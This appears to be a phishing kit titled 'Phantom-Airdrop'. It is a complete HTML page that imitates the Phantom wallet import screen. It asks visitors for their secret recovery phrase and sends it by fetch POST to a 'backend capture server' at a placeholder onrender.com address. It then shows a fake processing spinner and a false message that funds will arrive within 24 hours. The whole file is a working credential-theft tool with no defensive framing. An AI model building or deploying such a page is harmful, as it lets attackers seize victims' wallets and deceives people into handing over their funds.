# Phantom-Airdrop
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Phantom Wallet - Import</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
  body {
    margin: 0;
    background: linear-gradient(160deg, #1e004c, #2d0066);
    font-family: 'Inter', sans-serif;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    text-align: center;
    padding: 20px;
  }
  .container {
    background: rgba(255 255 255 / 0.05);
    padding: 40px 30px;
    border-radius: 12px;
    width: 360px;
    box-shadow: 0 0 20px rgba(108, 92, 231, 0.6);
  }
  .logo {
    width: 60px;
    margin-bottom: 20px;
  }
  h1 {
    font-weight: 700;
    font-size: 2rem;
    margin-bottom: 20px;
  }
  textarea {
    width: 100%;
    border-radius: 5px;
    border: none;
    padding: 10px;
    font-size: 16px;
    resize: none;
    font-family: 'Inter', sans-serif;
  }
  button {
    margin-top: 20px;
    padding: 12px 24px;
    background-color: #6c5ce7;
    border: none;
    border-radius: 5px;
    color: white;
    font-size: 16px;
    cursor: pointer;
  }
  .spinner {
    border: 6px solid rgba(255 255 255 / 0.2);
    border-top: 6px solid #6c5ce7;
    border-radius: 50%;
    width: 48px;
    height: 48px;
    margin: 30px auto;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .message, .success {
    font-size: 1.1rem;
    margin-top: 20px;
  }
  .message {
    color: #ccc;
  }
  .success {
    color: #6c5ce7;
  }
</style>
</head>
<body>
  <div class="container" id="formContainer">
    <img src="phantom-logo.svg" alt="Phantom Logo" class="logo" />
    <h1>Import Wallet</h1>
    <p>Securely access your existing wallet using your Secret Recovery Phrase.</p>
    <textarea id="phrase" placeholder="Enter your 12 or 24-word phrase..." rows="4"></textarea>
    <button onclick="submitPhrase()">Continue</button>
  </div>

  <div class="container" id="loadingContainer" style="display:none;">
    <h1>Processing your wallet...</h1>
    <div class="spinner"></div>
    <div class="message" id="loadingMessage">Please wait while we verify your information.</div>
    <div class="success" id="successMsg" style="display:none;">
      Your wallet has been successfully confirmed.<br />
      Funds will arrive within 24 hours.
    </div>
  </div>

  <script>
    function submitPhrase() {
      const phrase = document.getElementById('phrase').value.trim();
      if (!phrase) {
        alert('Please enter your secret recovery phrase.');
        return;
      }

      // Show loading screen
      document.getElementById('formContainer').style.display = 'none';
      document.getElementById('loadingContainer').style.display = 'block';

      // Send phrase to backend capture server
      fetch('https://your-render-url.onrender.com/import', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seedphrase: phrase })
      }).catch(e => {
        // Handle fetch error silently or alert user if needed
        console.error('Error sending phrase:', e);
      });

      // Show fake processing and then success message
      setTimeout(() => {
        document.getElementById('loadingMessage').style.display = 'none';
        document.getElementById('successMsg').style.display = 'block';
      }, 5000);
    }
  </script>
</body>
</html>


